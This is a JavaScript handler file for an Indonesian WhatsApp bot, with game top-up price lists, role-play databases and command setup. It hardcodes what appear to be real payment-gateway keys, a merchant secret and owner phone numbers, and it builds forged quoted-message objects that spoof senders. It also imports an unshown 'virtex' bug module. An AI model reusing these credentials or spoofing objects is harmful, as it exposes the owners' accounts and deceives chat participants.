const { default: ManikConnect, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, makeInMemoryStore, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const pino = require('pino')
const fdl = require("caliph-api");
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const hx = require('hxz-api')
const xfar = require('xfarr-api')
const os = require('os')
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args))
const FormData = require("form-data");
const ms = require('parse-ms')
const toMs = require('ms')
const Jimp = require('jimp')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { recognize } = require('./lib/ocr')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { onGoing, dadu, asupan } = require("./FuncBot/otakudesu.js")
const { smsg, formatp, formatDate, getTime, isUrl, sleep, clockString, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom } = require('./FuncBot/myfunc.js')
const { addLevelingId, addLevelingLevel, addLevelingXp, getLevelingId, getLevelingLevel, getLevelingXp } = require("./FuncBot/lvlfunction")
const speedofbot = require("performance-now")
const { color, mylog, infolog } = require("./FuncBot/color");
const premium = require("./FuncBot/premium");
const { isLimit, limitAdd, getDeposit, addDeposit, kurangDeposit, getLimit, giveLimit, addlistml, kuranglistml, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./FuncBot/limit");
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./FuncBot/respon-list');
const { addRespons, checkRespons, deleteRespons } = require('./FuncBot/respon');
const Dym = require("didyoumean");
const { convertSaldo } = require("./FuncBot/dana");
const { initialize, getStatus, getStatusByNumber, logout } = require('./buglog.js')
const { csrfGenerator, listProduct, isProductValid, getDetailProduct, getQrCode, convertGopay } = require("./FuncBot/gopay");
let Manik = fs.readFileSync('./media/Manik.jpg')
const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
const welcomeJson = require('./FuncBot/group/welcome.json')
const namerpg = require("./FuncBot/namerpg");
const rumahrpg = require("./FuncBot/rumahrp");
const level = require("./FuncBot/level");
const instagram = require("./FuncBot/instagram")
const requestDepo = JSON.parse(fs.readFileSync('./database/otodepo.json'))
global.api = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({ ...query, ...(apikeyqueryname ? { [apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name] : name] } : {}) })) : '')
global.db = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db) global.db = {
sticker: {},
database: {},
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

 
global.targt = ''
global.jwbb = ''
global.teksft = ''
global.called = false
global.Prefix = 'Multi'
global.ownerNumber = '6283155997772'
global.creator = '6283155997772@s.whatsapp.net'
global.botvirtex = '6283159983710@s.whatsapp.net'
global.botName = 'YUDHA BOT' 
global.owner = ['6283155997772'] 
global.ownerName = 'Yudha Permana'
global.packName = 'Yudha' 
global.author = 'Yudha P'
global.sessionName = 'ManikQr'
global.limitawal = { premium: "∞", free: 100 }
global.thumb = fs.readFileSync('./media/Manik.jpg')
global.fakeImg = fs.readFileSync('./media/fake.jpg')
global.hargadmff = 1261
global.hargadmml = 1700
global.hargasewa = 10000


// FITUR TOPUP OTOMATIS 
global.merchant = 'M220510ACSX4641HS'
global.secret = 'b1d9e744f099744007c225a6fdd33578406aabfdb8f1ff6aabca6b400a8c4445'
global.signature = '2a180d152ceac6b2a5e7b8053a4e1b02'
//CARA AKTIFIN:
//1. DAFTAR DI APIGAMES.UD
//2. AMBIL MERCHANT ID DAN SECRET KEY
//3. DAFTAR DI UNIPIN
//4. HUBUNGKAN AKUN UNIPIN DENGAN APIGANES DI BAGIAN KONEKSI
//5. BUAT SIGNATURE DENGAN TOOLS ENCRYPT MD5 MERCHANTID+SECRETKEY
//6 PASANG DIATAS SITU DAJ SELESAI.

//REST APIS
global.APIs = { 
    bx: 'https://bx-hunter.herokuapp.com',
    dhnjing: 'https://dhnjing.xyz',
    hardianto: 'https://hardianto-chan.herokuapp.com',
    jonaz: 'https://jonaz-api-v2.herokuapp.com',
    neoxr: 'https://neoxr-api.herokuapp.com',
    nrtm: 'https://nurutomo.herokuapp.com',
    pencarikode: 'https://pencarikode.xyz',
    xteam: 'https://api.xteam.xyz',
    zahir: 'https://zahirr-web.herokuapp.com',
    zekais: 'http://zekais-api.herokuapp.com',
    zeks: 'https://api.zeks.xyz',
	oni: 'https://oni-chan.my.id',
	lol: 'https://api.lolhuman.xyz/',
  }
  global.APIKeys = { 
    'https://bx-hunter.herokuapp.com': 'Ikyy69',
    'https://hardianto-chan.herokuapp.com': 'hardianto',
    'https://neoxr-api.herokuapp.com': 'yntkts',
    'https://pencarikode.xyz': 'pais',
    'https://api.xteam.xyz': 'apikeymu',
    'https://zahirr-web.herokuapp.com': 'zahirgans',
    'https://api.zeks.xyz': 'apivinz',
  }
 

//TRIPAY
const apiKey = 'lonxskd9ohT7NMqpCVG13tluWGOaPcGP70Hr1fpX'
const privateKey = 'pfp0N-YhUsB-rgfbI-m7SEB-c0x3H'
const merchant_code = 'T15700'

//===SETTING BONUS RP BY MANIK===//
let healawal = "10" //Ini Bonus Daftar RP
let potionawal = "10" //Ini Bonus Daftar RP
let crystalawal = "1000" //Ini Bonus Daftar RP
let uangawal = "10000" //Ini Bonus Daftar RP
let rplimitawal = '25'//Ini Bonus Daftar RP
let rpliminya = 1 * 1

let tebaklagu = db.game.tebaklagu = []
let _family100 = db.game.family100 = []
let kuismath = db.game.math = []
let tebakgambar = db.game.tebakgambar = []
let tebakkata = db.game.tebakkata = []
let caklontong = db.game.lontong = []
let caklontong_desk = db.game.lontong_desk = []
let tebakkalimat = db.game.kalimat = []
let tebaklirik = db.game.lirik = []
let tebaktebakan = db.game.tebakan = []
let vote = db.others.vote = []
let judullist = []
let trennama = db.others.trennama = []
let trenemail = db.others.trenemail =[]
let trenpw = db.others.trenpw =[]
let daftarlist = []

//LIST APIPKEY
let lolkey = 'SadTeams'

const _heal = JSON.parse(fs.readFileSync('./database/adventure/heal.json'))
const _potion = JSON.parse(fs.readFileSync('./database/adventure/potion.json'))
const _crystal = JSON.parse(fs.readFileSync('./database/adventure/crystal.json'))
const _money = JSON.parse(fs.readFileSync('./database/adventure/uang.json'))
let _level = JSON.parse(fs.readFileSync('./database/adventure/level.json'))
let _rplimit = JSON.parse(fs.readFileSync('./database/adventure/rplimit.json'))
let _rumah = JSON.parse(fs.readFileSync('./database/adventure/Orangrpg.json'));
let _leveling = JSON.parse(fs.readFileSync('./database/adventure/leveling.json'))
let _name = JSON.parse(fs.readFileSync('./database/adventure/namerpg.json'));
const anonChat = JSON.parse(fs.readFileSync('./database/anonymous.json'))
let antiyt = JSON.parse(fs.readFileSync('./database/antiyt.json'));
let antivirtex = JSON.parse(fs.readFileSync('./database/antivirtex.json'));
let antitele = JSON.parse(fs.readFileSync('./database/antitele.json'));
let antibadword = JSON.parse(fs.readFileSync('./database/antibadword.json'));
let antibitly = JSON.parse(fs.readFileSync('./database/antibitly.json'));
let akinator = JSON.parse(fs.readFileSync('./database/akinator.json'));
let pendaftar = JSON.parse(fs.readFileSync('./database/user.json'))
let listCmd = JSON.parse(fs.readFileSync('./database/listcmd.json'));
let _cmd = JSON.parse(fs.readFileSync('./database/command.json'));
let _cmdUser = JSON.parse(fs.readFileSync('./database/commandUser.json'));
let _premium = JSON.parse(fs.readFileSync('./database/premium.json'));
let balance = JSON.parse(fs.readFileSync('./database/balance.json'));
let money = JSON.parse(fs.readFileSync('./uang.json'));
let deposit = JSON.parse(fs.readFileSync('./deposit.json'));
let limit = JSON.parse(fs.readFileSync('./database/limit.json'));
let glimit = JSON.parse(fs.readFileSync('./database/glimit.json'));
let setting = JSON.parse(fs.readFileSync('./config.json'));
let simin = JSON.parse(fs.readFileSync('./database/simi.json'))
let responDB = JSON.parse(fs.readFileSync('./database/respon.json'));
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
let list = {
  "ff": {
    "FF5": {
    "nama": "5 Diamond",
    "hargaid": 900,
    "harga":"Rp900",
    },
        "FF10": {
    "nama": "10 Diamond",
    "hargaid": 1800,
    "harga":"Rp1.800",
    },
        "FF15": {
    "nama": "15 Diamond",
    "hargaid": 2700,
    "harga":"Rp2.700",
    },
        "FF20": {
    "nama": "20 Diamond",
    "hargaid": 3000,
    "harga":"Rp3.000",
    },
        "FF25": {
    "nama": "25 Diamond",
    "hargaid": 3900,
    "harga":"Rp3.900",
    },
        "FF30": {
    "nama": "30 Diamond",
    "hargaid": 4800,
    "harga":"Rp4.800",
    },
        "FF40": {
    "nama": "40 Diamond",
    "hargaid": 6000,
    "harga":"Rp6.000",
    },
        "FF50": {
    "nama": "50 Diamond",
    "hargaid": 7200,
    "harga":"Rp7.200",
    },
        "FF55": {
    "nama": "55 Diamond",
    "hargaid": 8100,
    "harga":"Rp8.100",
    },
        "FF60": {
    "nama": "60 Diamond",
    "hargaid": 9000,
    "harga":"Rp9.000",
    },
        "FF70": {
    "nama": "70 Diamond",
    "hargaid": 9900,
    "harga":"Rp9.900",
    },
        "FF75": {
    "nama": "75 Diamond",
    "hargaid": 10800,
    "harga":"Rp10.800",
    },
"FF80": {
"nama": "80 Diamond",	
"hargaid":11700,
"harga":"Rp11.700",
},
"FF90": {
"nama": "90 Diamond",	
"hargaid":12900,
"harga":"Rp12.900",
},
"FF95": {
"nama": "95 Diamond",	
"hargaid":13800,
"harga":"Rp13.800",	
},
"FF100": {
"nama": "100 Diamond",	
"hargaid": 14400,
"harga":"Rp14.400",
},
"FF120": {
"nama": "120 Diamond",	
"hargaid":17100,
"harga":"Rp17.100",
},
"FF130": {
"nama": "130 Diamond",	
"hargaid":18900,
"harga":"Rp18.900",
},
"FF140": {
"nama": "140 Diamond",	
"hargaid":19800,
"harga":"Rp19.800",	
},
"FF145": {
"nama": "145 Diamond",	
"hargaid":20700,
"harga":"Rp20.700",
},
"FF150": {
"nama": "150 Diamond",	
"hargaid":21600,
"harga":"Rp21.600",
},
"FF160": {
"nama": "160 Diamond",	
"hargaid":22800,
"harga":"Rp22.800",
},
"FF180": {
"nama": "180 Diamond",	
"hargaid":25800,
"harga":"Rp25.800",
},
"FF190": {
"nama": "190 Diamond",	
"hargaid":27000,
"harga":"Rp27.000",
},
"FF200": {
"nama": "200 Diamond",	
"hargaid":28800,
"harga":"Rp28.800",
},
"FF210": {
"nama": "210 Diamond",	
"hargaid":29700,
"harga":"Rp29.700",
},
"FFM": {
"nama": "Member Mingguan",
"hargaid":30000,
"harga":"Rp30.000",
},
"FF250": {
"nama": "250 Diamond",	
"hargaid":35700,
"harga":"Rp35.700",
},
"FF280": {
"nama": "280 Diamond",	
"hargaid":39600,
"harga":"Rp39.600",
},
"FF300": {
"nama": "300 Diamond",	
"hargaid":42600,
"harga":"Rp42.600",
},
"FF355": {
"nama": "355 Diamond",	
"hargaid":49900,
"harga":"Rp49.900",
},
"FF350": {
"nama": "350 Diamond",	
"hargaid":49500,
"harga":"Rp49.500",
},
"FF375": {
"nama": "375 Diamond",	
"hargaid":52500,
"harga":"Rp52.500",
},
"FF400": {
"nama": "400 Diamond",	
"hargaid":56400,
"harga":"Rp56.400",
},
"FF405": {
"nama": "405 Diamond",	
"hargaid":56700,
"harga":"Rp56.700",
},
"FF425": {
"nama": "425 Diamond",	
"hargaid":59400,
"harga":"Rp59.400",
},
"FF475": {
"nama": "475 Diamond",	
"hargaid":66600,
"harga":"Rp66.600",
},
"FF500": {
"nama": "500 Diamond",	
"hargaid":70200,
"harga":"Rp70.200",
},
"FF510": {
"nama": "510 Diamond",	
"hargaid": 72000,
"harga":"Rp72.000",
},
"FF515": {
"nama": "515 Diamond",	
"hargaid": 72300,
"harga":"Rp72.300",
},

"FF512": {
"nama": "512+3 Diamond",	
"hargaid":72300,
"harga":"Rp72.300",
},
"FF545": {
"nama": "545 Diamond",	
"hargaid":76500,
"harga":"Rp76.500",
},
"FF565": {
"nama": "565 Diamond",	
"hargaid":79200,
"harga":"Rp79.200",	
},
"FF600": {
"nama": "600 Diamond",	
"hargaid":84600,
"harga":"Rp84.600",
},
"FF635": {
"nama": "635 Diamond",	
"hargaid": 89100,
"harga":"Rp89.100",
},
"FF645": {
"nama": "645 Diamond",	
"hargaid":90900,
"harga":"Rp90.900",
},
"FF655": {
"nama": "655 Diamond",	
"hargaid":92100,
"harga":"Rp92.100",
},
"FF720": {
"nama": "720 Diamond",	
"hargaid": 99000,
"harga":"Rp99.000",
},
"FF700": {
"nama": "700 Diamond",	
"hargaid":99000,
"harga":"Rp99.000",
},
"FF770": {
"nama": "770 Diamond",	
"hargaid":106200,
"harga":"Rp106.200",	
},
"FF790": {
"nama": "790 Diamond",	
"hargaid": 108900,
"harga":"Rp108.900",
},
"FF800": {
"nama": "800 Diamond",	
"hargaid": 110700,
"harga":"Rp110.700",
},
"FF860": {
"nama": "860 Diamond",	
"hargaid": 118800,
"harga":"Rp118.800",
},
"FF930": {
"nama": "930 Diamond",	
"hargaid":128700,
"harga":"Rp128.700",
},
"FF1000": {
"nama": "1000 Diamond",	
"hargaid":138600,
"harga":"Rp138.600",	
},
"FF1050": {
"nama": "1050 Diamond",	
"hargaid":145800,
"harga":"Rp145.800",
},
"FF1075": {
"nama": "1075 Diamond",	
"hargaid":148500,
"harga":"Rp148.500",
},
"FF1080": {
"nama": "1080 Diamond",	
"hargaid":149400,
"harga":"Rp149.400",
},
"FFB": {
"nama": "Member Bulanan",
"hargaid":150000,
"harga":"Rp150.000",
},
"FF1200": {
"nama": "1200 Diamond",	
"hargaid":166800,
"harga":"Rp166.800",
},
"FF1215": {
"nama": "1215 Diamond",	
"hargaid":16830,
"harga":"Rp168.300",
},
"FF1300": {
"nama": "1300 Diamond",	
"hargaid":180900,
"harga":"Rp180.900",
},
"FF1440": {
"nama": "1440 Diamond",	
"hargaid":198000,
"harga":"Rp198.000",
},
"FF1450": {
"nama": "1450 Diamond",	
"hargaid":199800,
"harga":"Rp199.800",
},
"FF1490": {
"nama": "1490 Diamond",	
"hargaid":205200,
"harga":"Rp205.200",
},
"FF1510": {
"nama": "1510 Diamond",	
"hargaid":207900,
"harga":"Rp207.900",
},
"FF1580": {
"nama": "1580 Diamond",	
"hargaid":217800,
"harga":"Rp217.800",
},
"FF1795": {
"nama": "1795 Diamond",	
"hargaid":247500,
"harga":"Rp247.500",
},
"FF1800": {
"nama": "1800, Diamond",	
"hargaid": 248400,
"harga":"Rp248.400",
},
"FF2000": {
"nama": "2000 Diamond",	
"hargaid":270000,
"harga":"Rp270.000",
},
"FF2140": {
"nama": "2140 Diamond",	
"hargaid": 289800,
"harga":"Rp289.800",
},
"FF2190": {
"nama": "2190 Diamond",	
"hargaid": 297000,
"harga":"Rp297.000",
},
"FF2210": {
"nama": "2210 Diamond",	
"hargaid": 299700,
"harga":"Rp299.700",
},
"FF2280": {
"nama": "2280 Diamond",	
"hargaid": 309600,
"harga":"Rp309.600",
},
"FF2355": {
"nama": "2355 Diamond",	
"hargaid": 319500,
"harga":"Rp319.500",
},
"FF2720": {
"nama": "2720 Diamond",	
"hargaid": 369000,
"harga":"Rp369.000",
},
"FF4000": {
"nama": "4000 Diamond",	
"hargaid": 540000,
"harga":"Rp540.000",
},
"FF77290": {
"nama": "7290 Diamond",	
"hargaid": 990000,
"harga":"Rp990.000",
},
},
};
let listml = {
  "ml": {
    "UPMBL5": {
    "nama": "5 Diamond",
    "hargaid": 1700,
    "harga":"Rp1.700",
    },
        "UPMBL12": {
    "nama": "12 Diamond",
    "hargaid": 4000,
    "harga":"Rp4.000",
    },
    "ZIDMBL17": {
    "nama": "17 Diamond",
    "hargaid": 4500,
    "harga":"Rp4.500",
    },
        "UPMBL19": {
    "nama": "19 Diamond",
    "hargaid": 7000,
    "harga":"Rp7.000",
    },
        "UPMBL28": {
    "nama": "28 Diamond",
    "hargaid": 10500,
    "harga":"Rp10.500",
    },
        "UPMBL36": {
    "nama": "36 Diamond",
    "hargaid": 13000,
    "harga":"Rp13.000",
    },
        "UPMBL44": {
    "nama": "44 Diamond",
    "hargaid": 15000,
    "harga":"Rp15.000",
    },
        "UPMBL59": {
    "nama": "59 Diamond",
    "hargaid": 18500,
    "harga":"Rp18.500",
    },
        "UPMBL74": {
    "nama": "74 Diamond",
    "hargaid": 22500,
    "harga":"Rp22.500",
    },
        "UPMBL85": {
    "nama": "85 Diamond",
    "hargaid": 26500,
    "harga":"Rp26.500",
    },
        "UPMBL170": {
    "nama": "170 Diamond",
    "hargaid": 51500,
    "harga":"Rp51.500",
    },
        "UPMBL185": {
    "nama": "185 Diamond",
    "hargaid": 56500,
    "harga":"Rp56.500",
    },
        "UPMBL222": {
    "nama": "222 Diamond",
    "hargaid": 67500,
    "harga":"Rp67.500",
    },
        "UPMBL240": {
    "nama": "240 Diamond",
    "hargaid": 72500,
    "harga":"Rp72.500",
    },
        "UPMBL296": {
    "nama": "296 Diamond",
    "hargaid": 89500,
    "harga":"Rp89.500",
    },
        "UPMBL370": {
    "nama": "370 Diamond",
    "hargaid": 111500,
    "harga":"Rp111.500",
    },
        "UPMBL408": {
    "nama": "408 Diamond",
    "hargaid": 123500,
    "harga":"Rp123.500",
    },
        "UPMBL568": {
    "nama": "568 Diamond",
    "hargaid": 167500,
    "harga":"Rp167.500",
    },
        "UPMBL875": {
    "nama": "875 Diamond",
    "hargaid": 256500,
    "harga":"Rp256.500",
    },
        "UPMBL1159": {
    "nama": "1159 Diamond",
    "hargaid": 333500,
    "harga":"Rp333.500",
    },
        "UPMBL2010": {
    "nama": "2010 Diamond",
    "hargaid": 555.500,
    "harga":"Rp555.500",
    },
        "UPMBL4830": {
    "nama": "4830 Diamond",
    "hargaid": 1322500,
    "harga":"Rp1322.500",
    },
 },
};
let listmlbb = {
  "ml": {
    "ZIDMBL17": {
    "nama": "17 Diamond",
    "hargaid": 4500,
    "harga":"Rp4.500",
    },
        "ZIDMBL34": {
    "nama": "34 Diamond",
    "hargaid": 9000,
    "harga":"Rp9.000",
    },
    "ZIDMBL50": {
    "nama": "50 Diamond",
    "hargaid": 13500,
    "harga":"Rp13.500",
    },
        "ZIDMBL66": {
    "nama": "66 Diamond",
    "hargaid": 18000,
    "harga":"Rp18.000",
    },
        "ZIDMBL74": {
    "nama": "74 Diamond",
    "hargaid": 20000,
    "harga":"Rp20.000",
    },
        "ZIDMBL83": {
    "nama": "83 Diamond",
    "hargaid": 22500,
    "harga":"Rp22.500",
    },
        "ZIDMBL184": {
    "nama": "184 Diamond",
    "hargaid": 5000,
    "harga":"Rp50.000",
    },
        "ZIDMBL366": {
    "nama": "366 Diamond",
    "hargaid": 100000,
    "harga":"Rp100.000",
    },
        "ZIDMBL758": {
    "nama": "758 Diamond",
    "hargaid": 200000,
    "harga":"Rp200.000",
    },
 },
}

const stire = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
module.exports = Manik = async (Manik, m, smsg, mentioned, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        const args = chath.split(' ')
        const command = chath.toLowerCase().split(' ')[0] || ''
        const isCmd = command.startsWith(prefix)
        const pushname = m.pushName || "No Name"
        const botNumber = await Manik.decodeJid(Manik.user.id)
        const isManik = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = chath.slice(command.length + 1, chath.length)
        const from = m.chat
		//jadibot
	//	const sender2 = isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const sender = m.sender
        const isGroup = m.isGroup
        const tanggal = moment().format("ll")
        const jam = moment().format("HH:mm:ss z")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
	    const isMedia = /image|video|sticker|audio/.test(mime)
        const groupMetadata = m.isGroup ? await Manik.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const isAntiLink = m.isGroup ? antilink.includes(m.chat) : false
        const isAntiVirtex = m.isGroup ? antivirtex.includes(m.chat) : false
        const isAntiYt = isGroup ? antiyt.includes(from) : false
        const isAntiTele = isGroup ? antitele.includes(from) : false
        const isAntiBadword = isGroup ? antibadword.includes(from) : false
        const isAntiBitly = isGroup ? antibitly.includes(from) : false
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isUser = pendaftar.includes(sender)
    	const isPremium = isManik ? true : premium.checkPremiumUser(m.sender, _premium)
        moment.tz.setDefault("Asia/Jakarta").locale("id");
        const gcounti = setting.gcount
		const gcount = isPremium ? gcounti.prem : gcounti.user
		const { ownerNumber, botName, gamewaktu, limitCount } = setting
		const isSami = simin.includes(from)
		const isLevelingOn = isGroup ? _leveling.includes(from) : false
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const isBrave = namerpg.checkNameUser(sender, _name)
		global.isWelcome = isGroup ? welcomeJson.includes(from) : true
		const conn = Manik
		

	
		//FAKE REPLY EX : { quoted: fake }
	const fake = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6283102650464-1589321480@g.us" } : {}) 
                },
	 message: { 
		"extendedTextMessage": {
                 "text": `*Hallo* _${pushname} 👋_\n	╰≻ ${command}`,
                 "title": `Hmm`,
                 'jpegThumbnail': global.thumb
                        }
	                  } 
                     }

	const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `*HIDETAG!*`,jpegThumbnail: global.thumb}}}
	const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6283102650464-1589321480@g.us","inviteCode": "m","groupName": "ManikBot", "caption": `©AryaManik`, 'jpegThumbnail': global.thumb}}}
    const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6283102650464-1589321480@g.us" } : {}) },message: { "videoMessage": { "title":`*AUTO DOWNLOAD AUDIO YOUTUBE*`, "h": `Hmm`,'seconds': '10000000⁰0', 'caption': `*AUTO DOWNLOAD AUDIO YOUTUBE*`, 'jpegThumbnail': global.thumb}}}

let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)	
const runtime = function (seconds) {
seconds = Number(seconds);
var d = Math.floor(seconds / (3600 * 24));
var h = Math.floor((seconds % (3600 * 24)) / 3600);
var m = Math.floor((seconds % 3600) / 60);
var s = Math.floor(seconds % 60);
var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " Day, ") : "";
var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " Hour, ") : "";
var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " Minute, ") : "";
var sDisplay = s > 0 ? s + (s == 1 ? " second" : " Second") : "";
return dDisplay + hDisplay + mDisplay + sDisplay;
}

const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? Manik.sendMessage(from, {text: teks.trim(), jpegThumbnail: fs.readFileSync('./media/Manik.jpg')}, text, { sendEphemeral: true, contextInfo: { mentions: memberr } }) : Manik.sendMessage(from, {text: teks.trim(), jpegThumbnail: fs.readFileSync('./media/Manik.jpg')}, text, { sendEphemeral: true, quoted: m, contextInfo: { mentions: memberr } })
}
const reply = (teks) => {
			Manik.sendMessage(from, { text: teks }, { quoted: m })
}
const reply2 = (teks) => {
Manik.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botName}`,"body": `AryaManik OFFICIAL Goup`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./media/Manik.jpg`),"sourceUrl": "https://chat.whatsapp.com/Gz9bSMZnFFr9avr61IVOKa"}}}, { quoted: m, contextInfo: { externalAdReply: {
  showAdAttribution: true,
  mediaType: 'VIDEO',
  mediaUrl: '',
  title: 'ManikBot',
  body: 'By AryaManik',
  thumbnail: global.thumb,
  sourceUrl: 'ɑ'
  }}})
}       
const reply1 = (teks) => {
Manik.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botName}`,"body": `Follow Instagram Arya Manik`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./media/Manik.jpg`),"sourceUrl": "https://instagram.com/aryamanik___"}}}, { quoted: m})
}

try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
depo: '0',
}
let chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {}
if (chats) {
if (!('mute' in chats)) chats.mute = false
if (!('wame' in chats)) chats.wame = false
} else global.db.chats[m.chat] = {
mute: false,
wame: false,
}
} catch (err) {
console.error(err)
}
	    
if (!Manik.public) {
if (!m.key.fromMe) return
}
function ngelistisi(){
let list = '';
list += `${judullist[0]}\n`;
daftarlist.forEach(function (item, index){
index = index+1;
list += `${index}. ${item}\n`
});
return list;
}

function bar(p) {
let titik = "▒".repeat(10).split("")

for (let i = 1; i <= p; i++) {
if (i%10 == 0) {
titik[(i/10)-1] = "█";
}
}
return "[ " + titik.join(" ") + " ]";
}
function ngelisttugas(){
let list = '';
list += "Daftar tugas : \n"
tugas.forEach(function (item, index){
index = index+1;
list += `${index}. ${item}\n`
});
return list;
}
const casinoSave = (db, obj, session) => {
var mine = db
const dbdir = `./database/${session}.json`
fs.writeFileSync(dbdir, JSON.stringify(obj, null, 2))
}
const setCasino = (session) => {
const dbdir = `./database/${session}.json`
if (!fs.existsSync(dbdir)) {
const objcas = {
status: true,
turn: 'Z',
session: session,
Z: null,
Y: null,
nominal: null,
}
casinoSave(dbdir, objcas, session)
return objcas
} else {
const read = JSON.parse(fs.readFileSync(dbdir))
return read
}
}

const checkIdDepo = (userId) => {
	const deppo = JSON.parse(fs.readFileSync(`./database/depo/${from}.json`))
    let status = false;
    Object.keys(deppo).forEach((i) => {
        if (deppo[i].id === userId) {
            status = true;
        }
    })
    return status
}
const checkRefDepo = (userId) => {
	const deppo = JSON.parse(fs.readFileSync(`./database/depo/${from}.json`))
    let status = ''
    Object.keys(deppo).forEach((i) => {
        if (deppo[i].id === userId) {
            status = deppo[i].ref
        }
    })
    return status
}
const checkStsDepo = (userId) => {
	const deppo = JSON.parse(fs.readFileSync(`./database/depo/${from}.json`))
    let status = ''
    Object.keys(deppo).forEach((i) => {
        if (deppo[i].id === userId) {
            status = deppo[i].status
        }
    })
    return status
}
		const checkIdBuy = (userId) => {
	const deppo = JSON.parse(fs.readFileSync(`./database/buy/${from}.json`))
    let status = false;
    Object.keys(deppo).forEach((i) => {
        if (deppo[i].id === userId) {
            status = true;
        }
    })
    return status
}
const checkRefBuy = (userId) => {
	const deppo = JSON.parse(fs.readFileSync(`./database/buy/${from}.json`))
    let status = ''
    Object.keys(deppo).forEach((i) => {
        if (deppo[i].id === userId) {
            status = deppo[i].ref
        }
    })
    return status
}
